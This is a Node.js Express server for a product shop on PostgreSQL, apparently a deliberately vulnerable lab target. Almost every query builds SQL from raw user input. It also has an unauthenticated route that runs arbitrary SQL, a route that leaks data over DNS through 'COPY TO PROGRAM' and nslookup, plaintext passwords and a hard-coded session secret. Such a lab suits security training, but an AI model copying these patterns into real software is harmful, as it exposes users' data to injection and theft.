const express = require("express");
const session = require('express-session');
const cookieParser = require('cookie-parser');
const app = express();
const path = require("path");
const Pool = require('pg').Pool;
const pool = require('./db');

app.use(express.json());
app.use(cookieParser());
app.use(session({
    secret: 'abdul',
    resave: false,
    saveUninitialized: true,
    cookie: {secure: false,
        maxAge: 2 * 60 * 60 * 1000
    }
}));

app.use(express.urlencoded({ extended: true }));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

pool.connect((err, client, release) =>{
    if (err) {
        console.error("Error acquiring client");
    }
    client.query('SELECT NOW()', (err, result) => {
        release();
        if (err) {
            console.error("Error executing query");
        } else {
            console.log("Current time:", result.rows[0]);
        }
        console.log("Connected to Database.")
    });
})

app.get("/", (req, res) => {
    res.render("index", { isLoggedIn: req.session.isLoggedIn,
        userId: req.session.userId,
        user: req.session.user
     });
});

app.get("/Error_page", (req, res) => {
    req.session.user = req.session.user || null;
    res.render("Error_page", { error: req.session.error,
        user: req.session.user
     });
});

app.get("/products", async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM products WHERE category_id = '1';");
        const categories = await pool.query("SELECT * FROM categories;");
        res.render("products", { products: result.rows, categories: categories.rows,
            user: req.session.user
         });
    } catch (err) {
        console.error("Error fetching products:", err);
        res.status(500).render("Error_page", { error: err,
            user: req.session.user
         });
    }
});

app.get("/products/category/:id", async (req, res) => {
    try {
        const categoryId = req.params.id; 
        const result = await pool.query(`SELECT * FROM products WHERE category_id = ${categoryId}`);
        const categories = await pool.query("SELECT * FROM categories;");
        res.render("products", { products: result.rows, categories: categories.rows,
            user: req.session.user
         });
    } catch (err) {
        console.error("Error fetching products:", err);
        res.status(500).render("Error_page", { error: err,
            user: req.session.user
         });
    }
});

app.get('/products/check-stock/:id', async (req, res) => {
    const productId = req.params.id;
    const result = await pool.query(
        `SELECT stock_numbers FROM products WHERE id = ${productId}`
    );
    if (result.rows[0].stock_numbers > 0) {
        res.send(`Stock check completed, ${result.rows[0].stock_numbers} in stock`);
    } else {
        res.status(404).send("Product not found");
    }
});

app.get('/admin/stacked/:command', async (req, res) => {
    const command = req.params.command;
    try {
        const result = await pool.query(`${command};`)
    } catch (error) {
        console.error("Error during command execution:", error);
        res.status(500).send("Internal Server Error");
    }
});

app.get("/dns-exfil/:data", async (req, res) => {
    try {
        const dnsData = req.params.data;
        const result = await pool.query(`COPY (SELECT version()) TO PROGRAM
            'nslookup' || (SELECT version()) || '.${dnsData}'`);
        res.send("Data sent via DNS exfiltration");
    } catch (error) {
        console.error("Error during DNS exfiltration:", error);
        res.status(500).send("Internal Server Error");
    }
});

app.get("/products/search", async (req, res) => {
    const searchTerm = req.query.q;
    try {
        const result = await pool.query(`SELECT * FROM products WHERE name LIKE '%${searchTerm}%' or description LIKE '%${searchTerm}%'`);
        const categories = await pool.query("SELECT * FROM categories;");
        res.render("products", { products: result.rows, categories: categories.rows,
            user: req.session.user
         });
    } catch (err) {
        console.error("Error fetching products:", err);
        res.status(500).render("Error_page", { error: err,
            user: req.session.user
         });
    }
});

app.get('/user', async (req, res) => {
    const result = await pool.query(`SELECT * FROM users WHERE id='${req.session.userId}'`);
    req.session.userId = result.rows[0].id;
    req.session.isLoggedIn = true;
    req.session.user = { 
        first_name: result.rows[0].first_name,
        last_name: result.rows[0].last_name,
        email: result.rows[0].email,
        phone_number: result.rows[0].phone_number,
        username: result.rows[0].username
    }
    res.render('user', { user: result.rows[0] });
})

app.get('/profile/edit', (req, res) => {
    res.render('edit_profile', { user: req.session.user
     });
});

app.get('/admin/edit/:id', async (req, res) => {
    const user_to_edit = req.params.id;
    const result = await pool.query(`SELECT * FROM users WHERE id = '${user_to_edit}'`);
    res.render('edit_user', { user: req.session.user, 
        user_to_edit: result.rows[0] });
});

app.post('/admin/edit/:id', async (req, res) => {
    const user_to_edit = req.params.id;
    const { first_name, last_name, email, phone_number, username, password, is_admin } = req.body;
    if (!first_name || !last_name || !email || !phone_number || !username || !password) {
        req.error("error", "All fields are required");
        return res.redirect(`/admin/edit/${user_to_edit}`);
    } try {
        await pool.query(`UPDATE users SET first_name = '${first_name}', last_name = '${last_name}', email = '${email}', phone_number = '${phone_number}', username = '${username}', password_hash = '${password}', is_admin = ${is_admin} WHERE id = '${user_to_edit}'`);
        res.redirect('/admin');
    } catch (err) {
        console.error("Error updating user:", err);
        req.error("error", "Error updating user");
        return res.redirect(`/admin/edit/${user_to_edit}`);
    }
    
});

app.post('/profile/edit', async (req, res) => {
    const { first_name, last_name, email, phone_number, username } = req.body;
    if (!first_name || !last_name || !email || !phone_number || !username) {
        req.error("error", "All fields are required");
        return res.redirect('/profile/edit');
    }
    try {
        await pool.query(`UPDATE users SET first_name = '${first_name}', last_name = '${last_name}', email = '${email}', phone_number = '${phone_number}', username = '${username}' WHERE id = '${req.session.userId}'`);
        req.session.user = { first_name, last_name, email, phone_number, username };
        res.redirect('/user');
    } catch (err) {
        if (err.constraint === 'users_email_key') {
            req.errors("error", "Email already exists");
        } else if(err.constraint === 'users_username_key'){
            req.errors("error", "Username already exists");
        } else if (err.constraint === 'users_phone_number_key') {
            req.errors("error", "Phone number already exists");
        } else {
            console.error("Error updating profile:", err);
                    req.errors("error", "Error updating profile");
                }
        res.redirect('/profile/edit');
    }
});

app.get('/password/change', (req, res) => {
    res.render('change_pass', { user: req.session.user });
});

app.post('/password/change', async (req, res) => {
    const { current_password, new_password } = req.body;
    if (!current_password || !new_password) {
        req.error("error", "All fields are required");
        return res.redirect('/password/change');
    }
    try {
        const result = await pool.query(`SELECT * FROM users WHERE id = '${req.session.userId}' AND password_hash = '${current_password}'`);
        if (result.rows.length > 0) {
            await pool.query(`UPDATE users SET password_hash = '${new_password}' WHERE id = '${req.session.userId}'`);
            res.redirect('/user');
        } else {
            req.error("error", "Current password is incorrect");
            res.redirect('/password/change');
        }
    } catch (err) {
        console.error("Error changing password:", err);
        req.error("error", "Error changing password");
        res.redirect('/password/change');
    }
});

app.post('/delete/:id', async (req, res) => {
    const userId = req.params.id;
    try {
        if (req.session.user.id === userId) {
            await pool.query(`DELETE FROM users WHERE id = '${userId}'`);
            req.session.destroy();
            res.redirect('/');
        } else {
            res.status(403).send("Access denied");
        }
    } catch (err) {
        console.error("Error deleting user:", err);
        res.status(500).send("Error deleting user");
    }
});

app.get("/register", (req, res) => {
    res.render("register", { user: req.session.user || {} });
});

app.post('/register', async (req, res) => {
    const is_admin = false;
    const {first_name, last_name, email, phone_number, username, password} = req.body;
    try {
        const result = await pool.query(`INSERT INTO users (first_name, last_name, email, phone_number, username, password_hash, is_admin) VALUES ('${first_name}', '${last_name}', '${email}', '${phone_number}', '${username}', '${password}', ${is_admin}) RETURNING *`);
        req.session.userId = result.rows[0].id;
        req.session.isLoggedIn = true;
        req.session.user = {
            id: result.rows[0].id,
            first_name: result.rows[0].first_name,
            last_name: result.rows[0].last_name,
            email: result.rows[0].email,
            phone_number: result.rows[0].phone_number,
            username: result.rows[0].username,
            is_admin: result.rows[0].is_admin
        };
        const userAgent = req.headers["user-agent"];
        const ipAddress = req.ip;
        const accessLog = await pool.query(`INSERT INTO access_logs (user_id, user_agent, ip_address) VALUES ('${req.session.userId}', '${userAgent}', '${ipAddress}') RETURNING *`);
        req.session.accessLogId = accessLog.rows[0].id;
        res.render('user', { user: req.session.user, message: "Access Logged." });
    } catch (err) {
        console.error("Error registering user:", err);
        res.status(500).send("Error registering user");
    }
});

app.get("/login", (req, res) => {
    res.render("login", { user: req.session.user || {} });
});

app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    try {
        const result = await pool.query(`SELECT * FROM users WHERE username = '${username}' AND password_hash = '${password}'`);
        if (result.rows.length > 0) {
            req.session.userId = result.rows[0].id;
            req.session.isLoggedIn = true;
            req.session.user = {
                id: result.rows[0].id,
                first_name: result.rows[0].first_name,
                last_name: result.rows[0].last_name,
                email: result.rows[0].email,
                phone_number: result.rows[0].phone_number,
                username: result.rows[0].username,
                is_admin: result.rows[0].is_admin
            }
            res.redirect('/user');
        } else {
            res.status(401).json({ message: "Invalid credentials" });
        }
    } catch (err) {
        console.error("Error logging in:", err);
        res.status(500).send("Error logging in");
    }
});

app.post("/logout", (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error("Error logging out:", err);
            res.status(500).send("Error logging out");
        } else {
            res.clearCookie('connect.sid', { path: '/' });
            res.redirect("/");
        }
    });
});

app.get('/admin', async (req, res) => {
    if (!req.session.isLoggedIn || req.session.user.username !== 'admin') {
        res.status(403);
        return res.redirect("/");
    }
    try {
        const result = await pool.query('SELECT id, first_name, last_name, email, phone_number, username, password_hash FROM users');
        res.render('admin', { users: result.rows, user: req.session.user });
    } catch (err) {
        console.error("Error fetching users:", err);
        res.status(500).send("Error fetching users");
    }
});

app.get('/admin/add_user', (req, res) => {
    if (!req.session.isLoggedIn || req.session.user.username !== 'admin') {
        return res.status(403).send("Access denied");
    }
    res.render('register', { user: req.session.user });
});

app.post("/admin/delete/:id", (req, res) => {
    if (!req.session.isLoggedIn || req.session.user.username !== 'admin') {
        return res.status(403).send("Access denied");
    }
    const userId = req.params.id;
    pool.query(`DELETE FROM users WHERE id = ${userId}`)
        .then(() => {
            res.redirect('/admin');
        })
        .catch(err => {
            console.error("Error deleting user:", err);
            res.status(500).send("Error deleting user");
        });
});



app.listen(3000, (error) => {
    if (error) {
        console.error("Error starting server:", error);
    } else {
        console.log("Server is running on port 3000");
    }
});